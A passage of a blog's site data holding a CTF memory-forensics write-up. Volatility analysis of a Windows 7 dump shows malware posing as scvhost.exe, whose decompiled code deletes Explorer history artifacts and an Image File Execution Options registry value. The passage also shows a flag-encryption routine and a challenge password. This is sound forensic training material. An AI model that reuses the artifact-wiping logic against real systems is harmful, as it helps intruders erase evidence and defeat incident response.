          *(undefined8 *)((longlong)&uStack_48 + lVar4 + lVar3) = 0x1400032b0;\r\n                FUN_1400a8620((longlong *)(&stack0x00000260 + lVar3),\r\n                              \"C:\\\\Windows\\\\System32\\\\config\\\\systemprofile\\\\AppData\\\\Local\\\\Microso ft\\\\Windows\\\\UsrClass.dat\"\r\n                             );\r\n                *(undefined8 *)((longlong)&uStack_48 + lVar4 + lVar3) = 0x1400032bf;\r\n                FUN_1400736b0();\r\n                *(undefined8 *)((longlong)&uStack_48 + lVar4 + lVar3) = 0x1400032ce;\r\n                pcVar12 = (char *)FUN_140031060((undefined8 *)(&stack0x00000260 + lVar3));\r\n                *(undefined8 *)((longlong)&uStack_48 + lVar4 + lVar3) = 0x1400032d6;\r\n                remove(pcVar12);\r\n                *(undefined8 *)((longlong)&uStack_48 + lVar4 + lVar3) = 0x1400032e5;\r\n                FUN_140073680();\r\n                *(undefined8 *)((longlong)&uStack_48 + lVar4 + lVar3) = 0x140003305;\r\n                FUN_1400a8620((longlong *)(&stack0x00000240 + lVar3),\r\n                              \"C:\\\\Windows\\\\System32\\\\config\\\\systemprofile\\\\AppData\\\\Local\\\\Microso ft\\\\Windows\\\\Explorer\\\\ComDlg32.dll.mui\"\r\n                             );\r\n                *(undefined8 *)((longlong)&uStack_48 + lVar4 + lVar3) = 0x140003314;\r\n                FUN_1400736b0();\r\n                *(undefined8 *)((longlong)&uStack_48 + lVar4 + lVar3) = 0x140003323;\r\n                pcVar12 = (char *)FUN_140031060((undefined8 *)(&stack0x00000240 + lVar3));\r\n                *(undefined8 *)((longlong)&uStack_48 + lVar4 + lVar3) = 0x14000332b;\r\n                remove(pcVar12);\r\n                *(undefined8 *)((longlong)&uStack_48 + lVar4 + lVar3) = 0x14000333a;\r\n                FUN_140073680();\r\n                *(undefined8 *)((longlong)&uStack_48 + lVar4 + lVar3) = 0x14000335a;\r\n                FUN_1400a8620((longlong *)(&stack0x00000220 + lVar3),\r\n                              \"C:\\\\Windows\\\\System32\\\\config\\\\systemprofile\\\\AppData\\\\Local\\\\Microso ft\\\\Windows\\\\Explorer\\\\RunMRU\"\r\n                             );\r\n                *(undefined8 *)((longlong)&uStack_48 + lVar4 + lVar3) = 0x140003369;\r\n                FUN_1400736b0();\r\n                *(undefined8 *)((longlong)&uStack_48 + lVar4 + lVar3) = 0x140003378;\r\n                pcVar12 = (char *)FUN_140031060((undefined8 *)(&stack0x00000220 + lVar3));\r\n                *(undefined8 *)((longlong)&uStack_48 + lVar4 + lVar3) = 0x140003380;\r\n                remove(pcVar12);\r\n                *(undefined8 *)((longlong)&uStack_48 + lVar4 + lVar3) = 0x14000338f;\r\n                FUN_140073680();\r\n                *(undefined8 *)((longlong)&uStack_48 + lVar4 + lVar3) = 0x1400033af;\r\n                FUN_1400a8620((longlong *)(&stack0x00000200 + lVar3),\r\n                              \"C:\\\\Windows\\\\System32\\\\config\\\\systemprofile\\\\AppData\\\\Local\\\\Microso ft\\\\Windows\\\\Explorer\\\\AutomaticDestinations\"\r\n                             );\r\n                *(undefined8 *)((longlong)&uStack_48 + lVar4 + lVar3) = 0x1400033be;\r\n                FUN_1400736b0();\r\n                *(undefined8 *)((longlong)&uStack_48 + lVar4 + lVar3) = 0x1400033cd;\r\n                pcVar12 = (char *)FUN_140031060((undefined8 *)(&stack0x00000200 + lVar3));\r\n                *(undefined8 *)((longlong)&uStack_48 + lVar4 + lVar3) = 0x1400033d5;\r\n                remove(pcVar12);\r\n                *(undefined8 *)((longlong)&uStack_48 + lVar4 + lVar3) = 0x1400033e4;\r\n                FUN_140073680();\r\n                *(undefined8 *)((longlong)&uStack_48 + lVar4 + lVar3) = 0x140003404;\r\n                FUN_1400a8620((longlong *)(&stack0x000001e0 + lVar3),\r\n                              \"C:\\\\Windows\\\\System32\\\\config\\\\systemprofile\\\\AppData\\\\Local\\\\Microso ft\\\\Windows\\\\Explorer\\\\RecentPlaces\"\r\n                             );\r\n                *(undefined8 *)((longlong)&uStack_48 + lVar4 + lVar3) = 0x140003413;\r\n                FUN_1400736b0();\r\n                *(undefined8 *)((longlong)&uStack_48 + lVar4 + lVar3) = 0x140003422;\r\n                pcVar12 = (char *)FUN_140031060((undefined8 *)(&stack0x000001e0 + lVar3));\r\n                *(undefined8 *)((longlong)&uStack_48 + lVar4 + lVar3) = 0x14000342a;\r\n                remove(pcVar12);\r\n                *(undefined8 *)((longlong)&uStack_48 + lVar4 + lVar3) = 0x140003439;\r\n                FUN_140073680();\r\n                *(undefined8 *)((longlong)&uStack_48 + lVar4 + lVar3) = 0x140003459;\r\n                FUN_1400a8620((longlong *)(&stack0x000001c0 + lVar3),\r\n                              \"C:\\\\Windows\\\\System32\\\\config\\\\systemprofile\\\\AppData\\\\Local\\\\Microso ft\\\\Windows\\\\Explorer\\\\WindowsSearch\"\r\n                             );\r\n                *(undefined8 *)((longlong)&uStack_48 + lVar4 + lVar3) = 0x140003468;\r\n                FUN_1400736b0();\r\n                *(undefined8 *)((longlong)&uStack_48 + lVar4 + lVar3) = 0x140003477;\r\n                pcVar12 = (char *)FUN_140031060((undefined8 *)(&stack0x000001c0 + lVar3));\r\n                *(undefined8 *)((longlong)&uStack_48 + lVar4 + lVar3) = 0x14000347f;\r\n                remove(pcVar12);\r\n                *(undefined8 *)((longlong)&uStack_48 + lVar4 + lVar3) = 0x14000348e;\r\n                FUN_140073680();\r\n                *(undefined8 *)((longlong)&uStack_48 + lVar4 + lVar3) = 0x1400034ae;\r\n                FUN_1400a8620((longlong *)(&stack0x000001a0 + lVar3),\r\n                              \"C:\\\\Windows\\\\System32\\\\config\\\\systemprofile\\\\AppData\\\\Local\\\\Microso ft\\\\Windows\\\\Explorer\\\\WindowsSearch\"\r\n                             );\r\n                *(undefined8 *)((longlong)&uStack_48 + lVar4 + lVar3) = 0x1400034bd;\r\n                FUN_1400736b0();\r\n                *(undefined8 *)((longlong)&uStack_48 + lVar4 + lVar3) = 0x1400034cc;\r\n                pcVar12 = (char *)FUN_140031060((undefined8 *)(&stack0x000001a0 + lVar3));\r\n                *(undefined8 *)((longlong)&uStack_48 + lVar4 + lVar3) = 0x1400034d4;\r\n                remove(pcVar12);\r\n                *(undefined8 *)((longlong)&uStack_48 + lVar4 + lVar3) = 0x1400034e3;\r\n                FUN_140073680();\r\n                *(undefined8 *)((longlong)&uStack_48 + lVar4 + lVar3) = 0x140003503;\r\n                FUN_1400a8620((longlong *)(&stack0x00000180 + lVar3),\r\n                              \"C:\\\\Windows\\\\System32\\\\config\\\\systemprofile\\\\AppData\\\\Local\\\\Microso ft\\\\Windows\\\\Explorer\\\\thumbs.db\"\r\n                             );\r\n                *(undefined8 *)((longlong)&uStack_48 + lVar4 + lVar3) = 0x140003512;\r\n                FUN_1400736b0();\r\n                *(undefined8 *)((longlong)&uStack_48 + lVar4 + lVar3) = 0x140003521;\r\n                pcVar12 = (char *)FUN_140031060((undefined8 *)(&stack0x00000180 + lVar3));\r\n                *(undefined8 *)((longlong)&uStack_48 + lVar4 + lVar3) = 0x140003529;\r\n                remove(pcVar12);\r\n                *(undefined1 **)(&stack0xffffffffffffffe0 + lVar4 + lVar3) =\r\n                     &stack0x00000178 + lVar3;\r\n                *(undefined8 *)((longlong)&uStack_48 + lVar4 + lVar3) = 0x14000355b;\r\n                RegOpenKeyExA((HKEY)0xffffffff80000002,\r\n                              \"SOFTWARE\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\Image File Execution  Options\"\r\n                              ,0,0xf003f,*(PHKEY *)(&stack0xffffffffffffffe0 + lVar4 + lVar3));\r\n                pHVar2 = *(HKEY *)(&stack0x00000178 + lVar3);\r\n                *(undefined8 *)((longlong)&uStack_48 + lVar4 + lVar3) = 0x140003575;\r\n                RegDeleteValueA(pHVar2,\"confidential.bin\");\r\n                pHVar2 = *(HKEY *)(&stack0x00000178 + lVar3);\r\n                *(undefined8 *)((longlong)&uStack_48 + lVar4 + lVar3) = 0x140003588;\r\n                RegCloseKey(pHVar2);\r\n                *(undefined1 **)(&stack0xffffffffffffffe0 + lVar4 + lVar3) =\r\n                     &stack0x00000170 + lVar3;\r\n                *(undefined8 *)((longlong)&uStack_48 + lVar4 + lVar3) = 0x1400035ba;\r\n                RegOpenKeyExW((HKEY)0xffffffff80000002,\r\n                              L\"SOFTWARE\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\Image File Executio n Options\"\r\n                              ,0,0xf003f,*(PHKEY *)(&stack0xffffffffffffffe0 + lVar4 + lVar3));\r\n                pHVar2 = *(HKEY *)(&stack0x00000170 + lVar3);\r\n                *(undefined8 *)((longlong)&uStack_48 + lVar4 + lVar3) = 0x1400035d4;\r\n                RegDeleteValueW(pHVar2,L\"confidential.bin\");\r\n                pHVar2 = *(HKEY *)(&stack0x00000170 + lVar3);\r\n                *(undefined8 *)((longlong)&uStack_48 + lVar4 + lVar3) = 0x1400035e7;\r\n                RegCloseKey(pHVar2);\r\n                *(undefined8 *)((longlong)&uStack_48 + lVar4 + lVar3) = 0x1400035f6;\r\n                FUN_140073680();\r\n                *(undefined8 *)((longlong)&uStack_48 + lVar4 + lVar3) = 0x140003616;\r\n                FUN_1400a8620((longlong *)(&stack0x00000150 + lVar3),\r\n                              \"C:\\\\Windows\\\\System32\\\\config\\\\systemprofile\\\\AppData\\\\Local\\\\Temp\\\\* \"\r\n                             );\r\n```\r\n![image](/images/posts/like-father-like-son/batman-13.png)\r\n\r\nAlso this is how the malware enumerates the list : ) \r\n\r\n\r\nAzrael was very sus , lets try running envars plugin to see the stuff which the variable uses . \r\n\r\n\r\n![image](/images/posts/like-father-like-son/batman-14.png)\r\n\r\n\r\nIm guessting that this is the key ? \r\n\r\nNow xoring it with 0x33 the value which we found earlier \r\n\r\n\r\n\r\nSince the malware deleated some stuff , i looked at MFT-table which on memlabs expereicne  has some flag parts or clues related to it ? \r\n\r\n\r\n![image](/images/posts/like-father-like-son/batman-15.png)\r\n\r\n\r\nOnto the next part , i need some explanations - \r\n\r\nThe Virtual Address Descriptor (VAD) node is a data structure used by the Windows operating system to manage virtual memory. Each VAD node contains information about a specific virtual memory region, including the starting and ending addresses, the memory protection constants, and other attributes.\r\n\r\nTo determine the memory protection constants for a specific VAD node, use the “vadinfo” plugin in the Volatility framework.\r\n\r\nVAD is a tree structure and like any tree structure it has a root (which is called Vadroot) and nodes/leafs (Vadnodes) that contains all the information related to memory ranges reserved for a specific process by the memory manager. For each chunk of a continuous virtual memory address allocations, memory manager creates a corresponding VAD node that contains the information about this continuous allocations \r\n\r\n![image](/images/posts/like-father-like-son/batman-16.png)\r\n\r\n![image](/images/posts/like-father-like-son/batman-17.png)\r\n\r\n```\r\nPS D:\\DFIR-LABS\\bi0sctfchall1> vol2 -f Damian.mem --profile Win7SP1x64 vaddump -p 1924 -D vads/\r\nVolatility Foundation Volatility Framework 2.6\r\nPid        Process              Start              End                Result\r\n---------- -------------------- ------------------ ------------------ ------\r\n      1924 scvhost.exe          0x000000007ffe0000 0x000000007ffeffff vads/scvhost.exe.11ff67b30.0x000000007ffe0000-0x000000007ffeffff.dmp\r\n      1924 scvhost.exe          0x0000000000110000 0x000000000030ffff vads/scvhost.exe.11ff67b30.0x0000000000110000-0x000000000030ffff.dmp\r\n      1924 scvhost.exe          0x0000000000040000 0x0000000000040fff vads/scvhost.exe.11ff67b30.0x0000000000040000-0x0000000000040fff.dmp\r\n      1924 scvhost.exe          0x0000000000020000 0x000000000002ffff vads/scvhost.exe.11ff67b30.0x0000000000020000-0x000000000002ffff.dmp\r\n      1924 scvhost.exe          0x0000000000010000 0x000000000001ffff vads/scvhost.exe.11ff67b30.0x0000000000010000-0x000000000001ffff.dmp\r\n      1924 scvhost.exe          0x0000000000030000 0x0000000000033fff vads/scvhost.exe.11ff67b30.0x0000000000030000-0x0000000000033fff.dmp\r\n      1924 scvhost.exe          0x0000000000060000 0x00000000000c6fff vads/scvhost.exe.11ff67b30.0x0000000000060000-0x00000000000c6fff.dmp\r\n      1924 scvhost.exe          0x0000000000050000 0x0000000000050fff vads/scvhost.exe.11ff67b30.0x0000000000050000-0x0000000000050fff.dmp\r\n      1924 scvhost.exe          0x00000000000e0000 0x00000000000e0fff vads/scvhost.exe.11ff67b30.0x00000000000e0000-0x00000000000e0fff.dmp\r\n      1924 scvhost.exe          0x00000000000d0000 0x00000000000d0fff vads/scvhost.exe.11ff67b30.0x00000000000d0000-0x00000000000d0fff.dmp\r\n      1924 scvhost.exe          0x0000000077020000 0x0000000077119fff vads/scvhost.exe.11ff67b30.0x0000000077020000-0x0000000077119fff.dmp\r\n      1924 scvhost.exe          0x00000000004a0000 0x000000000059ffff vads/scvhost.exe.11ff67b30.0x00000000004a0000-0x000000000059ffff.dmp\r\n      1924 scvhost.exe          0x0000000000490000 0x000000000049ffff vads/scvhost.exe.11ff67b30.0x0000000000490000-0x000000000049ffff.dmp\r\n      1924 scvhost.exe          0x0000000000320000 0x000000000041ffff vads/scvhost.exe.11ff67b30.0x0000000000320000-0x000000000041ffff.dmp\r\n      1924 scvhost.exe          0x0000000001d20000 0x0000000001f1ffff vads/scvhost.exe.11ff67b30.0x0000000001d20000-0x0000000001f1ffff.dmp\r\n      1924 scvhost.exe          0x0000000000730000 0x00000000008b0fff vads/scvhost.exe.11ff67b30.0x0000000000730000-0x00000000008b0fff.dmp\r\n      1924 scvhost.exe          0x00000000005a0000 0x0000000000727fff vads/scvhost.exe.11ff67b30.0x00000000005a0000-0x0000000000727fff.dmp\r\n      1924 scvhost.exe          0x00000000008c0000 0x0000000001cbffff vads/scvhost.exe.11ff67b30.0x00000000008c0000-0x0000000001cbffff.dmp\r\n      1924 scvhost.exe          0x0000000002470000 0x000000000266ffff vads/scvhost.exe.11ff67b30.0x0000000002470000-0x000000000266ffff.dmp\r\n      1924 scvhost.exe          0x00000000020b0000 0x00000000022affff vads/scvhost.exe.11ff67b30.0x00000000020b0000-0x00000000022affff.dmp\r\n      1924 scvhost.exe          0x00000000026b0000 0x00000000028affff vads/scvhost.exe.11ff67b30.0x00000000026b0000-0x00000000028affff.dmp\r\n      1924 scvhost.exe          0x0000000077240000 0x00000000773e8fff vads/scvhost.exe.11ff67b30.0x0000000077240000-0x00000000773e8fff.dmp\r\n      1924 scvhost.exe          0x0000000077120000 0x000000007723efff vads/scvhost.exe.11ff67b30.0x0000000077120000-0x000000007723efff.dmp\r\n      1924 scvhost.exe          0x000000007f0e0000 0x000000007ffdffff vads/scvhost.exe.11ff67b30.0x000000007f0e0000-0x000000007ffdffff.dmp\r\n      1924 scvhost.exe          0x000000007efe0000 0x000000007f0dffff vads/scvhost.exe.11ff67b30.0x000000007efe0000-0x000000007f0dffff.dmp\r\n      1924 scvhost.exe          0x000007fefefe0000 0x000007feff0bafff vads/scvhost.exe.11ff67b30.0x000007fefefe0000-0x000007feff0bafff.dmp\r\n      1924 scvhost.exe          0x000007fefd570000 0x000007fefd58efff vads/scvhost.exe.11ff67b30.0x000007fefd570000-0x000007fefd58efff.dmp\r\n      1924 scvhost.exe          0x000007fefd020000 0x000007fefd076fff vads/scvhost.exe.11ff67b30.0x000007fefd020000-0x000007fefd076fff.dmp\r\n      1924 scvhost.exe          0x000000013f130000 0x000000013f22afff vads/scvhost.exe.11ff67b30.0x000000013f130000-0x000000013f22afff.dmp\r\n      1924 scvhost.exe          0x000007fefd4f0000 0x000007fefd55afff vads/scvhost.exe.11ff67b30.0x000007fefd4f0000-0x000007fefd55afff.dmp\r\n      1924 scvhost.exe          0x000007fefd0c0000 0x000007fefd0cefff vads/scvhost.exe.11ff67b30.0x000007fefd0c0000-0x000007fefd0cefff.dmp\r\n      1924 scvhost.exe          0x000007fefd560000 0x000007fefd56dfff vads/scvhost.exe.11ff67b30.0x000007fefd560000-0x000007fefd56dfff.dmp\r\n      1924 scvhost.exe          0x000007fefe0c0000 0x000007fefe1ecfff vads/scvhost.exe.11ff67b30.0x000007fefe0c0000-0x000007fefe1ecfff.dmp\r\n      1924 scvhost.exe          0x000007fefd590000 0x000007fefd5f6fff vads/scvhost.exe.11ff67b30.0x000007fefd590000-0x000007fefd5f6fff.dmp\r\n      1924 scvhost.exe          0x000007fefdfa0000 0x000007fefe068fff vads/scvhost.exe.11ff67b30.0x000007fefdfa0000-0x000007fefe068fff.dmp\r\n      1924 scvhost.exe          0x000007fefe250000 0x000007fefefd7fff vads/scvhost.exe.11ff67b30.0x000007fefe250000-0x000007fefefd7fff.dmp\r\n      1924 scvhost.exe          0x000007fffffb0000 0x000007fffffd2fff vads/scvhost.exe.11ff67b30.0x000007fffffb0000-0x000007fffffd2fff.dmp\r\n      1924 scvhost.exe          0x000007feff430000 0x000007feff4a0fff vads/scvhost.exe.11ff67b30.0x000007feff430000-0x000007feff4a0fff.dmp\r\n      1924 scvhost.exe          0x000007feff280000 0x000007feff31efff vads/scvhost.exe.11ff67b30.0x000007feff280000-0x000007feff31efff.dmp\r\n      1924 scvhost.exe          0x000007feff250000 0x000007feff27dfff vads/scvhost.exe.11ff67b30.0x000007feff250000-0x000007feff27dfff.dmp\r\n      1924 scvhost.exe          0x000007feff320000 0x000007feff428fff vads/scvhost.exe.11ff67b30.0x000007feff320000-0x000007feff428fff.dmp\r\n      1924 scvhost.exe          0x000007feff560000 0x000007feff560fff vads/scvhost.exe.11ff67b30.0x000007feff560000-0x000007feff560fff.dmp\r\n      1924 scvhost.exe          0x000007fffffd9000 0x000007fffffdafff vads/scvhost.exe.11ff67b30.0x000007fffffd9000-0x000007fffffdafff.dmp\r\n      1924 scvhost.exe          0x000007fffffd7000 0x000007fffffd8fff vads/scvhost.exe.11ff67b30.0x000007fffffd7000-0x000007fffffd8fff.dmp\r\n      1924 scvhost.exe          0x000007fffffd5000 0x000007fffffd6fff vads/scvhost.exe.11ff67b30.0x000007fffffd5000-0x000007fffffd6fff.dmp\r\n      1924 scvhost.exe          0x000007fffffdd000 0x000007fffffdefff vads/scvhost.exe.11ff67b30.0x000007fffffdd000-0x000007fffffdefff.dmp\r\n      1924 scvhost.exe          0x000007fffffdb000 0x000007fffffdcfff vads/scvhost.exe.11ff67b30.0x000007fffffdb000-0x000007fffffdcfff.dmp\r\n      1924 scvhost.exe          0x000007fffffdf000 0x000007fffffdffff vads/scvhost.exe.11ff67b30.0x000007fffffdf000-0x000007fffffdffff.dmp\r\n```\r\n\r\nSince we now the flag format -biosCTF{} we can try to encrypt it with the arlogrithm used by AZRAEL keyword earlier and check if that's in the vads/heap data . \r\n\r\nEncryption algorithm: Double pass of (add digit → XOR → add digit → XOR) \r\n\r\n\r\n![image](/images/posts/like-father-like-son/batman-18.png)\r\n\r\n\r\n```\r\n[muffin@muffinn bi0sctfchall1]$ python3 solve.py \r\nplaintext[0] = 'b' -> '`'\r\nplaintext[1] = 'i' -> 'q'\r\nplaintext[2] = '0' -> '2'\r\nplaintext[3] = 's' -> 's'\r\nplaintext[4] = 'C' -> 'W'\r\nplaintext[5] = 'T' -> 'R'\r\nplaintext[6] = 'F' -> 'N'\r\nplaintext[7] = '{' -> ''\r\n\r\nResult: `q2sWRN`\r\n```\r\n\r\n\r\n![image](/images/posts/like-father-like-son/batman-19.png)\r\n\r\n\r\n\r\n\r\n```\r\n`q2sWRN\\u009d-\\x04ne\\x02~5a:v\"L}7\\tuc4tVaT@7Xo#wg2w5w0w!q4Lfi\\x04rLz5{3\\x08D1Vaxj2Jc\\x7f0EaK\\x0etF5faD15 \r\n```\r\nNow just reversing the ecp is the flag :)","src/content/blog/like-father-like-son.md","9422bf7162cc66ba",{"html":205,"metadata":206},"\u003Ch1 id=\"description\">Description\u003C/h1>\n\u003Cp>Damian Wayne stored a secret in his old pc, but Dr. Simon Hurt who got this information, planned a contingency against Damian by the help of Starlab’s techies, poor Damaian was so eager to view the encrypted secret file that Raven sent him long back but Simon knows this piece of information as well as the decryption process, will he win this situation like a Wayne? will Damaian’s Redemption be successful!?\u003C/p>\n\u003Cp>Note: This challenge doesn’t have any questions but the flag itself!\u003C/p>\n\u003Cp>File Password : vOCorthoAGESeNsivEli\u003C/p>\n\u003Ch2 id=\"initial-analysis\">Initial Analysis\u003C/h2>\n\u003Cp>Let’s first see the profile of the dump\u003C/p>\n\u003Cpre class=\"astro-code github-dark\" style=\"background-color:#24292e;color:#e1e4e8; overflow-x: auto;\" tabindex=\"0\" data-language=\"plaintext\">\u003Ccode>\u003Cspan class=\"line\">\u003Cspan>PS D:\\DFIR-LABS\\bi0sctfchall1> vol2 -f .\\Damian.mem imageinfo \u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>Volatility Foundation Volatility Framework 2.6\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>INFO    : volatility.debug    : Determining profile based on KDBG search...\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>          Suggested Profile(s) : Win7SP1x64, Win7SP0x64, Win2008R2SP0x64, Win2008R2SP1x64_23418, Win2008R2SP1x64, Win7SP1x64_23418\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>                     AS Layer1 : WindowsAMD64PagedMemory (Kernel AS)\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>                     AS Layer2 : FileAddressSpace (D:\\DFIR-LABS\\bi0sctfchall1\\Damian.mem)\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>                      PAE type : No PAE\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>                           DTB : 0x187000L\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>                          KDBG : 0xf8000280f0a0L\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>          Number of Processors : 6\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>     Image Type (Service Pack) : 1\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>                KPCR for CPU 0 : 0xfffff80002810d00L\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>                KPCR for CPU 1 : 0xfffff880009ea000L\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>                KPCR for CPU 2 : 0xfffff880030a8000L\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>                KPCR for CPU 3 : 0xfffff8800311d000L\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>                KPCR for CPU 4 : 0xfffff88003192000L\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>                KPCR for CPU 5 : 0xfffff880031c7000L\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>             KUSER_SHARED_DATA : 0xfffff78000000000L\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>           Image date and time : 2023-05-06 16:45:20 UTC+0000\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>     Image local date and time : 2023-05-06 22:15:20 +0530\u003C/span>\u003C/span>\u003C/code>\u003C/pre>\n\u003Cp>Now lets enumerate the pslist\u003C/p>\n\u003Cpre class=\"astro-code github-dark\" style=\"background-color:#24292e;color:#e1e4e8; overflow-x: auto;\" tabindex=\"0\" data-language=\"plaintext\">\u003Ccode>\u003Cspan class=\"line\">\u003Cspan>PS D:\\DFIR-LABS\\bi0sctfchall1> vol2 -f .\\Damian.mem --profile=Win7SP1x64 pslist\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>Volatility Foundation Volatility Framework 2.6\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>Offset(V)          Name                    PID   PPID   Thds     Hnds   Sess  Wow64 Start                          Exit\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>------------------ -------------------- ------ ------ ------ -------- ------ ------ ------------------------------ ------------------------------\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>0xfffffa80036e2040 System                    4      0     98      469 ------      0 2023-05-06 16:43:35 UTC+0000\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>0xfffffa8004961300 smss.exe                272      4      2       34 ------      0 2023-05-06 16:43:35 UTC+0000\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>0xfffffa80062e8a20 csrss.exe               352    332     10      353      0      0 2023-05-06 16:43:38 UTC+0000\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>0xfffffa80047ca060 wininit.exe             404    332      4       84      0      0 2023-05-06 16:43:39 UTC+0000\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>0xfffffa80047c8360 csrss.exe               412    396     10      290      1      0 2023-05-06 16:43:39 UTC+0000\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>0xfffffa800643a740 services.exe            464    404     14      196      0      0 2023-05-06 16:43:39 UTC+0000\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>0xfffffa8006444060 winlogon.exe            488    396      6      121      1      0 2023-05-06 16:43:39 UTC+0000\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>0xfffffa800498f260 lsass.exe               516    404     11      581      0      0 2023-05-06 16:43:40 UTC+0000\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>0xfffffa800644d5b0 lsm.exe                 524    404     10      147      0      0 2023-05-06 16:43:40 UTC+0000\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>0xfffffa800632a660 svchost.exe             628    464     13      372      0      0 2023-05-06 16:43:40 UTC+0000\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>0xfffffa80064d2b30 VBoxService.ex          692    464     13      123      0      0 2023-05-06 16:43:40 UTC+0000\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>0xfffffa800644bb30 svchost.exe             760    464      8      255      0      0 2023-05-06 16:43:41 UTC+0000\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>0xfffffa800651ab30 svchost.exe             840    464     20      392      0      0 2023-05-06 16:43:41 UTC+0000\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>0xfffffa800654a7c0 svchost.exe             896    464     21      476      0      0 2023-05-06 16:43:41 UTC+0000\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>0xfffffa8006552940 svchost.exe             924    464     33      875      0      0 2023-05-06 16:43:41 UTC+0000\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>0xfffffa8006575b30 audiodg.exe            1000    840      8      136      0      0 2023-05-06 16:43:41 UTC+0000\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>0xfffffa8004871060 svchost.exe             296    464     13      290      0      0 2023-05-06 16:43:41 UTC+0000\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>0xfffffa80065cfb30 svchost.exe             348    464     18      387      0      0 2023-05-06 16:43:41 UTC+0000\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>0xfffffa8006651a30 spoolsv.exe            1140    464     15      315      0      0 2023-05-06 16:43:42 UTC+0000\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>0xfffffa800656ab30 svchost.exe            1180    464     21      332      0      0 2023-05-06 16:43:42 UTC+0000\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>0xfffffa80066dbb30 taskhost.exe           1312    464     10      155      1      0 2023-05-06 16:43:43 UTC+0000\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>0xfffffa8006742b30 dwm.exe                1448    896      6      103      1      0 2023-05-06 16:43:43 UTC+0000\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>0xfffffa8006783060 explorer.exe           1532   1416     40     1002      1      0 2023-05-06 16:43:43 UTC+0000\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>0xfffffa800676d490 VBoxTray.exe           2044   1532     15      149      1      0 2023-05-06 16:43:44 UTC+0000\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>0xfffffa80066e3060 SearchIndexer.          300    464     14      644      0      0 2023-05-06 16:43:51 UTC+0000\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>0xfffffa8006305b30 SearchProtocol         1756    300      9      382      0      0 2023-05-06 16:43:51 UTC+0000\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>0xfffffa8006907b30 SearchFilterHo         1580    300      7      143      0      0 2023-05-06 16:43:51 UTC+0000\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>0xfffffa80062f5300 iexplore.exe           2668   1532     22      477      1      1 2023-05-06 16:44:41 UTC+0000\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>0xfffffa80038a2b30 iexplore.exe           2752   2668     21      434      1      1 2023-05-06 16:44:41 UTC+0000\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>0xfffffa8006434b30 iexplore.exe           2892   2668     20      388      1      1 2023-05-06 16:44:47 UTC+0000\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>0xfffffa8003967b30 scvhost.exe            1924   1532      5       55      1      0 2023-05-06 16:44:54 UTC+0000\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>0xfffffa800393db30 conhost.exe            2292    412      3       51      1      0 2023-05-06 16:44:54 UTC+0000\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>0xfffffa800398f660 notepad.exe            2320   1924      2       57      1      0 2023-05-06 16:44:54 UTC+0000\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>0xfffffa800699e750 RamCapture64.e          596   